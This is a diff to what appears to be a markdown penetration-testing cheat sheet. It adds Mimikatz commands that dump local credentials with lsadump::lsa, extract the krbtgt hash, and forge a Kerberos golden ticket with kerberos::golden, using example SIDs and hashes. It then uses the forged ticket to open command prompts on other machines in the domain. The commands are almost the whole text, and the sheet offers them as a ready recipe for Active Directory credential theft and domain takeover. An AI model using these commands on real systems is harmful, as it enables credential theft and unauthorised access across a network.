@@ -320,15 +320,48 @@ lsadump::sam dumps the local Security Account Manager (SAM) NT hashes (cf. SAM s
 
 #### example 2:
 ```
-lsadump::lsa
+lsadump::lsa /patch
 ```
+alternatively:
+```
+lsadump::lsa 
+```
+
 This is used to dump all local credentials on a Windows computer. LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).
 
 
 #### golden ticket example:
+first 
+```
+lsadump::lsa /inject /name:krbtgt
+```
+
+basic to create a Golden Ticket
+```
+kerberos::golden /user: /domain: /sid: /krbtgt: /id:
+```
+one example:
+```
+kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-3893474861-143125734-2112006029 /krbtgt:78558f004296a6f9438f4532164a7acd /id:500
+```
+
+alternative
+
 ```
 .\mimikatz.exe "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
 ```
+1.) 
+```
+misc::cmd
+```
+This will open a new command prompt with elevated privileges to all machines
+
+
+2.) Access other Machines! - You will now have another command prompt with access to all other machines on the network
+
+
+
+Use the Golden Ticket to access other machine -
 
 Mimikatz Golden Ticket Command Reference:
 
